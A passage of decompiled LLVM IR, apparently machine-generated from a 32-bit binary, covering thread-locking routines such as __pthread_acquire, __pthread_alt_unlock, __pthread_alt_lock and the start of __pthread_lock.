  %v0_80574a5 = phi i32 [ %v0_80574a1.pre, %dec_label_pc_80574a5.loopexit ], [ %v0_80574a5.pre, %entry ]
  %v1_80574a5 = inttoptr i32 %v0_80574a5 to i32*
  %v2_80574a5 = load i32, i32* %v1_80574a5, align 4
  %v2_80574a7 = inttoptr i32 %v1_80574a7 to i32*
  store i32 %v2_80574a5, i32* %v2_80574a7, align 4
  br label %dec_label_pc_80574a9

dec_label_pc_80574a9:                             ; preds = %dec_label_pc_805748c, %dec_label_pc_80574a5
  %v2_80574a9 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v2_80574a9

; uselistorder directives
  uselistorder i32 %v2_805749f8, { 1, 0 }
  uselistorder i32 %v0_80574a1.pre, { 2, 1, 0 }
  uselistorder i1 %v15_8057490, { 1, 2, 0 }
  uselistorder i32 %v2_8057490, { 1, 0 }
  uselistorder i32 %v0_80574a5.pre, { 1, 0, 2 }
  uselistorder i32 %v0_8057488, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80574a9, { 1, 0 }
  uselistorder label %dec_label_pc_80574a5, { 1, 0 }
  uselistorder label %dec_label_pc_805749d, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v0_80574ac = load i32, i32* @esi, align 4
  %v0_80574ad = load i32, i32* @ebx, align 4
  %v0_80574b1 = load i32, i32* @eax, align 4
  store i32 %v0_80574b1, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v2_80574da = ptrtoint i32* %stack_var_-16 to i32
  %v1_80574ec11 = inttoptr i32 %v0_80574b1 to i32*
  %v2_80574ec12 = load i32, i32* %v1_80574ec11, align 4
  store i32 1, i32* %v1_80574ec11, align 4
  %v1_80574ee13 = icmp eq i32 %v2_80574ec12, 0
  %v1_80574f014 = icmp eq i1 %v1_80574ee13, false
  br i1 %v1_80574f014, label %dec_label_pc_80574b7, label %dec_label_pc_80574f2

dec_label_pc_80574b7:                             ; preds = %entry, %dec_label_pc_80574e7.backedge
  %v0_80574b7 = load i32, i32* @esi, align 4
  %v1_80574b7 = add i32 %v0_80574b7, -49
  %v6_80574b7 = sub i32 48, %v0_80574b7
  %v7_80574b7 = and i32 %v6_80574b7, %v0_80574b7
  %v8_80574b7 = icmp slt i32 %v7_80574b7, 0
  %v9_80574b7 = icmp eq i32 %v1_80574b7, 0
  %v10_80574b7 = icmp slt i32 %v1_80574b7, 0
  %v3_80574ba = icmp eq i1 %v10_80574b7, %v8_80574b7
  %v4_80574ba = icmp eq i1 %v9_80574b7, false
  %v5_80574ba = and i1 %v4_80574ba, %v3_80574ba
  br i1 %v5_80574ba, label %dec_label_pc_80574c4, label %dec_label_pc_80574bc

dec_label_pc_80574bc:                             ; preds = %dec_label_pc_80574b7
  %v1_80574bc = call i32 @sched_yield(i32 %v0_80574ad)
  %v0_80574c1 = load i32, i32* @esi, align 4
  %v1_80574c1 = add i32 %v0_80574c1, 1
  store i32 %v1_80574c1, i32* @esi, align 4
  br label %dec_label_pc_80574e7.backedge

dec_label_pc_80574c4:                             ; preds = %dec_label_pc_80574b7
  store i32 0, i32* %stack_var_-16, align 4
  store i32 0, i32* @esi, align 4
  %v2_80574df = call i32 @nanosleep(i32 %v2_80574da, i32 0)
  br label %dec_label_pc_80574e7.backedge

dec_label_pc_80574e7.backedge:                    ; preds = %dec_label_pc_80574c4, %dec_label_pc_80574bc
  %v0_80574ec.pre = load i32, i32* @ebx, align 4
  %v1_80574ec = inttoptr i32 %v0_80574ec.pre to i32*
  %v2_80574ec = load i32, i32* %v1_80574ec, align 4
  store i32 1, i32* %v1_80574ec, align 4
  %v1_80574ee = icmp eq i32 %v2_80574ec, 0
  %v1_80574f0 = icmp eq i1 %v1_80574ee, false
  br i1 %v1_80574f0, label %dec_label_pc_80574b7, label %dec_label_pc_80574f2

dec_label_pc_80574f2:                             ; preds = %dec_label_pc_80574e7.backedge, %entry
  %v2_80574ec.lcssa = phi i32 [ %v2_80574ec12, %entry ], [ %v2_80574ec, %dec_label_pc_80574e7.backedge ]
  store i32 %v0_80574ad, i32* @ebx, align 4
  store i32 %v0_80574ac, i32* @esi, align 4
  ret i32 %v2_80574ec.lcssa

; uselistorder directives
  uselistorder i32 %v1_80574b7, { 1, 0 }
  uselistorder label %dec_label_pc_80574b7, { 1, 0 }
}

define i32 @wait_node_free() local_unnamed_addr {
entry:
  %v0_80574f8 = load i32, i32* @ebx, align 4
  %v0_80574f9 = load i32, i32* @eax, align 4
  store i32 %v0_80574f9, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807a61c.692 to i32), i32* @eax, align 4
  %v1_8057503 = call i32 @__pthread_acquire(i32 %v0_80574f8)
  %v0_8057508 = load i32, i32* @global_var_807a618.693, align 8
  %v1_805750d = load i32, i32* @ebx, align 4
  %v2_805750d = inttoptr i32 %v1_805750d to i32*
  store i32 %v0_8057508, i32* %v2_805750d, align 4
  %v0_805750f = load i32, i32* @ebx, align 4
  store i32 %v0_805750f, i32* @global_var_807a618.693, align 8
  store i32 0, i32* @global_var_807a61c.692, align 4
  ret i32 %v0_8057508
}

define i32 @restart.7() local_unnamed_addr {
entry:
  %v0_8057526 = load i32, i32* @eax, align 4
  %v1_8057527 = call i32 @__pthread_restart_new(i32 %v0_8057526)
  ret i32 %v1_8057527
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057530 = load i32, i32* @ebp, align 4
  %v0_8057531 = load i32, i32* @edi, align 4
  %v0_8057532 = load i32, i32* @esi, align 4
  %v0_8057533 = load i32, i32* @ebx, align 4
  store i32 %v0_8057533, i32* %stack_var_-16, align 4
  store i32 %tmp10, i32* @esi, align 4
  br label %dec_label_pc_805753b

dec_label_pc_805753b:                             ; preds = %dec_label_pc_805753b.backedge, %entry
  %v24_8057546 = phi i32 [ %v0_805753b.pre, %dec_label_pc_805753b.backedge ], [ %tmp10, %entry ]
  %v1_805753b = inttoptr i32 %v24_8057546 to i32*
  %v2_805753b = load i32, i32* %v1_805753b, align 4
  store i32 %v2_805753b, i32* %edx.global-to-local, align 4
  %tmp50 = or i32 %v2_805753b, 1
  %tmp51 = icmp eq i32 %tmp50, 1
  br i1 %tmp51, label %dec_label_pc_8057542, label %dec_label_pc_8057556

dec_label_pc_8057542:                             ; preds = %dec_label_pc_805753b
  store i32 0, i32* @ecx, align 4
  %v2_8057546 = load i32, i32* %v1_805753b, align 4
  %v15_8057546 = icmp eq i32 %v2_805753b, %v2_8057546
  %v22_8057546 = select i1 %v15_8057546, i32 0, i32 %v2_8057546
  store i32 %v22_8057546, i32* %v1_805753b, align 4
  %v1_805754a = zext i1 %v15_8057546 to i32
  %v2_805754a = load i32, i32* %edx.global-to-local, align 4
  %v3_805754a = and i32 %v2_805754a, -256
  %v4_805754a = or i32 %v3_805754a, %v1_805754a
  store i32 %v4_805754a, i32* %edx.global-to-local, align 4
  %v4_805754d = icmp eq i1 %v15_8057546, false
  br i1 %v4_805754d, label %dec_label_pc_805753b.backedge, label %dec_label_pc_80575d6.loopexit

dec_label_pc_805753b.backedge:                    ; preds = %dec_label_pc_8057542, %dec_label_pc_80575a8, %dec_label_pc_80575b2
  %v0_805753b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805753b

dec_label_pc_8057556:                             ; preds = %dec_label_pc_805753b
  %v9_805753d = icmp eq i32 %v2_805753b, 1
  store i32 %v2_805753b, i32* @ebx, align 4
  store i32 %v24_8057546, i32* @ebp, align 4
  store i32 %v2_805753b, i32* @edi, align 4
  store i32 %v24_8057546, i32* %stack_var_-28, align 4
  %v1_80575a62638 = icmp eq i1 %v9_805753d, false
  br i1 %v1_80575a62638, label %dec_label_pc_8057569.lr.ph, label %dec_label_pc_80575a8

dec_label_pc_8057569:                             ; preds = %dec_label_pc_8057569.lr.ph, %dec_label_pc_805756f
  %v0_805759f29 = phi i32 [ %v0_80575a3341, %dec_label_pc_8057569.lr.ph ], [ %v2_8057581, %dec_label_pc_805756f ]
  %v0_805759828 = phi i32 [ %v0_8057571540, %dec_label_pc_8057569.lr.ph ], [ %v0_8057581, %dec_label_pc_805756f ]
  %v0_805757327 = phi i32 [ %v0_8057573639, %dec_label_pc_8057569.lr.ph ], [ %v1_8057584, %dec_label_pc_805756f ]
  %v1_8057569 = add i32 %v0_805759f29, 8
  %v2_8057569 = inttoptr i32 %v1_8057569 to i32*
  %v3_8057569 = load i32, i32* %v2_8057569, align 4
  %v4_8057569 = icmp eq i32 %v3_8057569, 0
  br i1 %v4_8057569, label %dec_label_pc_805758a, label %dec_label_pc_805756f

dec_label_pc_805756f:                             ; preds = %dec_label_pc_8057569
  store i32 %v0_805759f29, i32* @ecx, align 4
  store i32 %v0_805759828, i32* @edx, align 4
  store i32 %v0_805757327, i32* @eax, align 4
  %v0_8057575 = call i32 @wait_node_dequeue()
  %v0_805757a = load i32, i32* @ebx, align 4
  store i32 %v0_805757a, i32* @eax, align 4
  %v0_805757c = call i32 @wait_node_free()
  %v0_8057581 = load i32, i32* @ebp, align 4
  %v1_8057581 = inttoptr i32 %v0_8057581 to i32*
  %v2_8057581 = load i32, i32* %v1_8057581, align 4
  store i32 %v2_8057581, i32* @ebx, align 4
  %v1_8057584 = load i32, i32* @esi, align 4
  %v9_80575a3 = icmp eq i32 %v2_8057581, 1
  %v1_80575a6 = icmp eq i1 %v9_80575a3, false
  br i1 %v1_80575a6, label %dec_label_pc_8057569, label %dec_label_pc_80575a8

dec_label_pc_805758a:                             ; preds = %dec_label_pc_8057569
  %v1_805758a = add i32 %v0_805759f29, 4
  %v2_805758a = inttoptr i32 %v1_805758a to i32*
  %v3_805758a = load i32, i32* %v2_805758a, align 4
  %v1_805758d = add i32 %v3_805758a, 24
  %v2_805758d = inttoptr i32 %v1_805758d to i32*
  %v3_805758d = load i32, i32* %v2_805758d, align 4
  %v5_8057594 = icmp slt i32 %v3_805758d, %stack_var_-24.1.ph42
  br i1 %v5_8057594, label %dec_label_pc_805759f, label %dec_label_pc_8057596

dec_label_pc_8057596:                             ; preds = %dec_label_pc_805758a
  store i32 %v0_805759f29, i32* @edi, align 4
  store i32 %v0_805759828, i32* %stack_var_-28, align 4
  br label %dec_label_pc_805759f

dec_label_pc_805759f:                             ; preds = %dec_label_pc_805758a, %dec_label_pc_8057596
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.1.ph42, %dec_label_pc_805758a ], [ %v3_805758d, %dec_label_pc_8057596 ]
  store i32 %v0_805759f29, i32* @ebp, align 4
  %v1_80575a1 = inttoptr i32 %v0_805759f29 to i32*
  %v2_80575a1 = load i32, i32* %v1_80575a1, align 4
  store i32 %v2_80575a1, i32* @ebx, align 4
  %v9_80575a325 = icmp eq i32 %v2_80575a1, 1
  %v1_80575a626 = icmp eq i1 %v9_80575a325, false
  br i1 %v1_80575a626, label %dec_label_pc_8057569.lr.ph, label %dec_label_pc_80575a8

dec_label_pc_8057569.lr.ph:                       ; preds = %dec_label_pc_8057556, %dec_label_pc_805759f
  %stack_var_-24.1.ph42 = phi i32 [ %stack_var_-24.0, %dec_label_pc_805759f ], [ -2147483648, %dec_label_pc_8057556 ]
  %v0_80575a3341 = phi i32 [ %v2_80575a1, %dec_label_pc_805759f ], [ %v2_805753b, %dec_label_pc_8057556 ]
  %v0_8057571540 = phi i32 [ %v0_805759f29, %dec_label_pc_805759f ], [ %v24_8057546, %dec_label_pc_8057556 ]
  %v0_8057573639 = phi i32 [ %v0_805757327, %dec_label_pc_805759f ], [ %v24_8057546, %dec_label_pc_8057556 ]
  br label %dec_label_pc_8057569

dec_label_pc_80575a8:                             ; preds = %dec_label_pc_805756f, %dec_label_pc_8057556, %dec_label_pc_805759f
  %stack_var_-24.1.ph.lcssa = phi i32 [ -2147483648, %dec_label_pc_8057556 ], [ %stack_var_-24.0, %dec_label_pc_805759f ], [ %stack_var_-24.1.ph42, %dec_label_pc_805756f ]
  %v0_805759f.lcssa = phi i32 [ %v2_805753b, %dec_label_pc_8057556 ], [ %v2_80575a1, %dec_label_pc_805759f ], [ %v2_8057581, %dec_label_pc_805756f ]
  %v8_80575a8 = icmp eq i32 %stack_var_-24.1.ph.lcssa, -2147483648
  br i1 %v8_80575a8, label %dec_label_pc_805753b.backedge, label %dec_label_pc_80575b2

dec_label_pc_80575b2:                             ; preds = %dec_label_pc_80575a8
  %v0_80575b4 = load i32, i32* @edi, align 4
  %v1_80575b4 = add i32 %v0_80575b4, 8
  %v2_80575b4 = inttoptr i32 %v1_80575b4 to i32*
  %v3_80575b4 = load i32, i32* %v2_80575b4, align 4
  store i32 %v0_805759f.lcssa, i32* %v2_80575b4, align 4
  %v1_80575b7 = icmp eq i32 %v3_80575b4, 0
  %v1_80575b9 = icmp eq i1 %v1_80575b7, false
  br i1 %v1_80575b9, label %dec_label_pc_805753b.backedge, label %dec_label_pc_80575bb

dec_label_pc_80575bb:                             ; preds = %dec_label_pc_80575b2
  %v0_80575bb = load i32, i32* @esi, align 4
  store i32 %v0_80575bb, i32* @eax, align 4
  %v0_80575bd = load i32, i32* @edi, align 4
  store i32 %v0_80575bd, i32* @ecx, align 4
  %v2_80575bf = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_80575bf, i32* @edx, align 4
  %v0_80575c2 = call i32 @wait_node_dequeue()
  %v0_80575c7 = load i32, i32* @edi, align 4
  %v1_80575c7 = add i32 %v0_80575c7, 4
  %v2_80575c7 = inttoptr i32 %v1_80575c7 to i32*
  %v3_80575c7 = load i32, i32* %v2_80575c7, align 4
  store i32 %v3_80575c7, i32* @eax, align 4
  %v2_80575cd = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80575cd, i32* @ebx, align 4
  %v0_80575d1 = call i32 @restart.7()
  br label %dec_label_pc_80575d6

dec_label_pc_80575d6.loopexit:                    ; preds = %dec_label_pc_8057542
  br label %dec_label_pc_80575d6

dec_label_pc_80575d6:                             ; preds = %dec_label_pc_80575d6.loopexit, %dec_label_pc_80575bb
  %v0_80575dd = phi i32 [ %v2_805753b, %dec_label_pc_80575d6.loopexit ], [ %v0_80575d1, %dec_label_pc_80575bb ]
  store i32 %v0_8057532, i32* @esi, align 4
  store i32 %v0_8057531, i32* @edi, align 4
  store i32 %v0_8057530, i32* @ebp, align 4
  ret i32 %v0_80575dd

; uselistorder directives
  uselistorder i32 %stack_var_-24.1.ph42, { 0, 2, 1 }
  uselistorder i32 %v2_8057581, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8057581, { 1, 0 }
  uselistorder i32 %v0_805759f29, { 0, 2, 1, 3, 4, 6, 5 }
  uselistorder i1 %v15_8057546, { 1, 2, 0 }
  uselistorder i32 %v2_8057546, { 1, 0 }
  uselistorder i32 %v2_805753b, { 2, 0, 1, 7, 6, 4, 5, 3, 8 }
  uselistorder i32 %v24_8057546, { 0, 1, 3, 2, 4 }
  uselistorder i32 ()* @wait_node_dequeue, { 1, 0 }
  uselistorder label %dec_label_pc_80575a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057569.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_805759f, { 1, 0 }
  uselistorder label %dec_label_pc_805753b.backedge, { 2, 1, 0 }
}

define i32 @thread_self.8() local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %v0_80575e5 = load i32, i32* @esp, align 4
  %v1_80575e5 = load i32, i32* @global_var_807a620.650, align 32
  %v7_80575e5 = icmp ult i32 %v0_80575e5, %v1_80575e5
  %v1_80575eb = icmp eq i1 %v7_80575e5, false
  br i1 %v1_80575eb, label %dec_label_pc_805761c, label %dec_label_pc_80575ed

dec_label_pc_80575ed:                             ; preds = %entry
  %v1_80575ed = load i32, i32* @global_var_807a624.651, align 4
  %v7_80575ed = icmp ult i32 %v0_80575e5, %v1_80575ed
  br i1 %v7_80575ed, label %dec_label_pc_8057602, label %dec_label_pc_80575f5

dec_label_pc_80575f5:                             ; preds = %dec_label_pc_80575ed
  %v1_80575fa = load i32, i32* @global_var_807a628.653, align 8
  %v7_80575fa = icmp ult i32 %v0_80575e5, %v1_80575fa
  br i1 %v7_80575fa, label %dec_label_pc_805761c, label %dec_label_pc_8057602

dec_label_pc_8057602:                             ; preds = %dec_label_pc_80575f5, %dec_label_pc_80575ed
  %v0_8057602 = load i32, i32* @global_var_807e100.654, align 256
  %v1_8057602 = icmp eq i32 %v0_8057602, 0
  br i1 %v1_8057602, label %dec_label_pc_8057610, label %dec_label_pc_805760b

dec_label_pc_805760b:                             ; preds = %dec_label_pc_8057602
  %v0_805760b = call i32 @__pthread_find_self()
  br label %dec_label_pc_8057610

dec_label_pc_8057610:                             ; preds = %dec_label_pc_8057602, %dec_label_pc_805760b
  %v2_8057616 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_805761c

dec_label_pc_805761c:                             ; preds = %dec_label_pc_80575f5, %entry, %dec_label_pc_8057610
  %v0_805761c = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_80575f5 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_8057616, %dec_label_pc_8057610 ]
  ret i32 %v0_805761c

; uselistorder directives
  uselistorder label %dec_label_pc_805761c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057610, { 1, 0 }
}

define i32 @suspend.9(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8057620 = load i32, i32* @eax, align 4
  %v1_8057621 = call i32 @__pthread_wait_for_restart_signal(i32 %v0_8057620)
  ret i32 %v1_8057621
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp9 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805762a = load i32, i32* @esi, align 4
  %v0_805762b = load i32, i32* @ebx, align 4
  store i32 %v0_805762b, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8057651 = ptrtoint i32* %stack_var_-20 to i32
  br label %dec_label_pc_8057637

dec_label_pc_8057637:                             ; preds = %dec_label_pc_8057655.dec_label_pc_8057637_crit_edge, %entry
  %v0_8057637 = phi i32 [ %v0_8057637.pre, %dec_label_pc_8057655.dec_label_pc_8057637_crit_edge ], [ %tmp9, %entry ]
  %v1_8057637 = inttoptr i32 %v0_8057637 to i32*
  %v2_8057637 = load i32, i32* %v1_8057637, align 4
  store i32 %v2_8057637, i32* @ebx, align 4
  store i32 1, i32* %ecx.global-to-local, align 4
  %v1_805763e = icmp eq i32 %v2_8057637, 0
  br i1 %v1_805763e, label %dec_label_pc_8057655, label %dec_label_pc_8057642

dec_label_pc_8057642:                             ; preds = %dec_label_pc_8057637
  %v0_8057642 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057642 = icmp eq i32 %v0_8057642, 0
  %v1_8057644 = icmp eq i1 %v1_8057642, false
  br i1 %v1_8057644, label %dec_label_pc_805764d, label %dec_label_pc_8057646

dec_label_pc_8057646:                             ; preds = %dec_label_pc_8057642
  %v0_8057646 = call i32 @thread_self.8()
  store i32 %v0_8057646, i32* %edx.global-to-local, align 4
  %v0_8057663.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805764d

dec_label_pc_805764d:                             ; preds = %dec_label_pc_8057642, %dec_label_pc_8057646
  %v0_8057663.pre = phi i32 [ %v0_8057637, %dec_label_pc_8057642 ], [ %v0_8057663.pre.pre, %dec_label_pc_8057646 ]
  store i32 %v2_8057651, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8057655

dec_label_pc_8057655:                             ; preds = %dec_label_pc_8057637, %dec_label_pc_805764d
  %v3_8057663 = phi i32 [ 1, %dec_label_pc_8057637 ], [ %v2_8057651, %dec_label_pc_805764d ]
  %v24_8057663 = phi i32 [ %v0_8057637, %dec_label_pc_8057637 ], [ %v0_8057663.pre, %dec_label_pc_805764d ]
  store i32 %v2_8057637, i32* %stack_var_-20, align 4
  %v1_8057663 = inttoptr i32 %v24_8057663 to i32*
  %v2_8057663 = load i32, i32* %v1_8057663, align 4
  %v15_8057663 = icmp eq i32 %v2_8057637, %v2_8057663
  %v22_8057663 = select i1 %v15_8057663, i32 %v3_8057663, i32 %v2_8057663
  store i32 %v22_8057663, i32* %v1_8057663, align 4
  %v1_8057667 = zext i1 %v15_8057663 to i32
  %v2_8057667 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8057667 = and i32 %v2_8057667, -256
  %v4_8057667 = or i32 %v3_8057667, %v1_8057667
  store i32 %v4_8057667, i32* @ecx, align 4
  %v4_805766a = icmp eq i1 %v15_8057663, false
  br i1 %v4_805766a, label %dec_label_pc_8057655.dec_label_pc_8057637_crit_edge, label %dec_label_pc_805766e

dec_label_pc_8057655.dec_label_pc_8057637_crit_edge: ; preds = %dec_label_pc_8057655
  %v0_8057637.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057637

dec_label_pc_805766e:                             ; preds = %dec_label_pc_8057655
  br i1 %v1_805763e, label %dec_label_pc_8057679, label %dec_label_pc_8057672

dec_label_pc_8057672:                             ; preds = %dec_label_pc_805766e
  %v0_8057672 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8057672, i32* @eax, align 4
  %v0_8057674 = load i32, i32* %stack_var_-20, align 4
  %v2_8057674 = call i32 @suspend.9(i32 %v0_8057674, i32 0)
  br label %dec_label_pc_8057679

dec_label_pc_8057679:                             ; preds = %dec_label_pc_805766e, %dec_label_pc_8057672
  %v0_805767e = phi i32 [ 0, %dec_label_pc_805766e ], [ %v2_8057674, %dec_label_pc_8057672 ]
  %v2_805767c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805767c, i32* @ebx, align 4
  store i32 %v0_805762a, i32* @esi, align 4
  ret i32 %v0_805767e

; uselistorder directives
  uselistorder i1 %v15_8057663, { 1, 2, 0 }
  uselistorder i32 %v2_8057663, { 1, 0 }
  uselistorder i32 %v0_8057637, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057679, { 1, 0 }
  uselistorder label %dec_label_pc_8057655, { 1, 0 }
  uselistorder label %dec_label_pc_805764d, { 1, 0 }
}

define i32 @__pthread_lock(i32 %arg1) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_8057680 = load i32, i32* @edi, align 4
  %v0_8057681 = load i32, i32* @esi, align 4
  %v0_8057682 = load i32, i32* @ebx, align 4
  %v0_8057686 = load i32, i32* @eax, align 4
  store i32 %v0_8057686, i32* @ebx, align 4
  %v0_8057688 = load i32, i32* @edx, align 4
  store i32 %v0_8057688, i32* @edi, align 4
  %v1_805768a = inttoptr i32 %v0_8057686 to i32*
  %v2_805768a = load i32, i32* %v1_805768a, align 4
  %v3_805768a = icmp eq i32 %v2_805768a, 0
  %v1_805768d = icmp eq i1 %v3_805768a, false
  br i1 %v1_805768d, label %dec_label_pc_80576a3, label %dec_label_pc_805768f

dec_label_pc_805768f:                             ; preds = %entry
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 1, i32* @ecx, align 4
  %v2_8057698 = load i32, i32* %v1_805768a, align 4
  %v15_8057698 = icmp eq i32 %v2_8057698, 0
  %v22_8057698 = select i1 %v15_8057698, i32 1, i32 %v2_8057698
  store i32 %v22_8057698, i32* %v1_805768a, align 4
  %v1_805769c = zext i1 %v15_8057698 to i32
  %v2_805769c = load i32, i32* %edx.global-to-local, align 4
  %v3_805769c = and i32 %v2_805769c, -256
  %v4_805769c = or i32 %v3_805769c, %v1_805769c
  store i32 %v4_805769c, i32* @edx, align 4
  %v4_805769f = icmp eq i1 %v15_8057698, false
  %v1_80576a1 = icmp eq i1 %v4_805769f, false
  br i1 %v1_80576a1, label %dec_label_pc_8057702, label %dec_label_pc_80576a3

dec_label_pc_80576a3:                             ; preds = %dec_label_pc_805768f, %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80576a5

dec_label_pc_80576a5:                             ; preds = %dec_label_pc_80576d4, %dec_label_pc_80576f2, %dec_label_pc_80576e5.preheader, %dec_label_pc_80576a3
  %v0_80576a5 = load i32, i32* @ebx, align 4
  %v1_80576a5 = inttoptr i32 %v0_80576a5 to i32*
  %v2_80576a5 = load i32, i32* %v1_80576a5, align 4
  store i32 %v2_80576a5, i32* @esi, align 4
  %v1_80576a7 = urem i32 %v2_80576a5, 2
  %v2_80576a7 = icmp eq i32 %v1_80576a7, 0
  %v1_80576ad = icmp eq i1 %v2_80576a7, false
  br i1 %v1_80576ad, label %dec_label_pc_80576bb, label %dec_label_pc_80576af

dec_label_pc_80576af:                             ; preds = %dec_label_pc_80576a5
  store i32 %v2_80576a5, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edx, align 4
  %v0_80576cd.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80576cd

dec_label_pc_80576bb:                             ; preds = %dec_label_pc_80576a5
  %v0_80576bb = load i32, i32* @edi, align 4
  %v1_80576bb = icmp eq i32 %v0_80576bb, 0
  %v1_80576bd = icmp eq i1 %v1_80576bb, false
  br i1 %v1_80576bd, label %dec_label_pc_80576c6, label %dec_label_pc_80576bf

dec_label_pc_80576bf:                             ; preds = %dec_label_pc_80576bb
  %v0_80576bf = call i32 @thread_self.8()
  store i32 %v0_80576bf, i32* @edi, align 4
  br label %dec_label_pc_80576c6

dec_label_pc_80576c6:                             ; preds = %dec_label_pc_80576bb, %dec_label_pc_80576bf
  %v0_80576c6 = phi i32 [ %v0_80576bb, %dec_label_pc_80576bb ], [ %v0_80576bf, %dec_label_pc_80576bf ]
  store i32 %v0_80576c6, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  br label %dec_label_pc_80576cd

dec_label_pc_80576cd:                             ; preds = %dec_label_pc_80576af, %dec_label_pc_80576c6
  %v1_80576d1 = phi i32 [ %v0_80576cd.pre, %dec_label_pc_80576af ], [ %v0_80576c6, %dec_label_pc_80576c6 ]
  %v0_80576af.sink = phi i32 [ %v2_80576a5, %dec_label_pc_80576af ], [ %v0_80576c6, %dec_label_pc_80576c6 ]
  %v1_80576b6 = or i32 %v0_80576af.sink, 1
  store i32 %v1_80576b6, i32* %ecx.global-to-local, align 4
  %v1_80576cd = icmp eq i32 %v1_80576d1, 0
  br i1 %v1_80576cd, label %dec_label_pc_80576d4, label %dec_label_pc_80576d1

dec_label_pc_80576d1:                             ; preds = %dec_label_pc_80576cd
  %v0_80576d1 = load i32, i32* @esi, align 4
  %v2_80576d1 = add i32 %v1_80576d1, 12
  %v3_80576d1 = inttoptr i32 %v2_80576d1 to i32*
  store i32 %v0_80576d1, i32* %v3_80576d1, align 4
  %v3_80576d6.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80576d4

dec_label_pc_80576d4:                             ; preds = %dec_label_pc_80576cd, %dec_label_pc_80576d1
  %v3_80576d6 = phi i32 [ %v1_80576b6, %dec_label_pc_80576cd ], [ %v3_80576d6.pre, %dec_label_pc_80576d1 ]
  %v0_80576d4 = load i32, i32* @esi, align 4
  %v0_80576d6 = load i32, i32* @ebx, align 4
  %v1_80576d6 = inttoptr i32 %v0_80576d6 to i32*
  %v2_80576d6 = load i32, i32* %v1_80576d6, align 4
  %v15_80576d6 = icmp eq i32 %v0_80576d4, %v2_80576d6
  %v22_80576d6 = select i1 %v15_80576d6, i32 %v3_80576d6, i32 %v2_80576d6
  store i32 %v22_80576d6, i32* %v1_80576d6, align 4
  %v1_80576da = zext i1 %v15_80576d6 to i32
  %v2_80576da = load i32, i32* %ecx.global-to-local, align 4
  %v3_80576da = and i32 %v2_80576da, -256
  %v4_80576da = or i32 %v3_80576da, %v1_80576da
  store i32 %v4_80576da, i32* @ecx, align 4
  %v4_80576dd = icmp eq i1 %v15_80576d6, false
  br i1 %v4_80576dd, label %dec_label_pc_80576a5, label %dec_label_pc_80576e1

dec_label_pc_80576e1:                             ; preds = %dec_label_pc_80576d4
  %v0_80576e1 = load i32, i32* @edx, align 4
  %v1_80576e1 = icmp eq i32 %v0_80576e1, 0
  %v1_80576e3 = icmp eq i1 %v1_80576e1, false
  br i1 %v1_80576e3, label %dec_label_pc_80576fc.preheader, label %dec_label_pc_80576e5.preheader

dec_label_pc_80576fc.preheader:                   ; preds = %dec_label_pc_80576e1
  %v0_80576fc14 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80576fc15 = add i32 %v0_80576fc14, -1
  store i32 %v1_80576fc15, i32* %ebp.global-to-local, align 4
  %v10_80576fd21 = icmp eq i32 %v0_80576fc14, 0
  %v1_805770022 = icmp eq i1 %v10_80576fd21, false
  br i1 %v1_805770022, label %dec_label_pc_80576f5, label %dec_label_pc_8057702

dec_label_pc_80576e5.preheader:                   ; preds = %dec_label_pc_80576e1
  %v0_80576e5.pre = load i32, i32* @edi, align 4
  store i32 %v0_80576e5.pre, i32* @eax, align 4
  %v2_80576e723 = call i32 @suspend.9(i32 %v0_8057682, i32 %v0_8057681)
  %v0_80576ec24 = load i32, i32* @edi, align 4
  %v1_80576ec25 = add i32 %v0_80576ec24, 12
  %v2_80576ec26 = inttoptr i32 %v1_80576ec25 to i32*
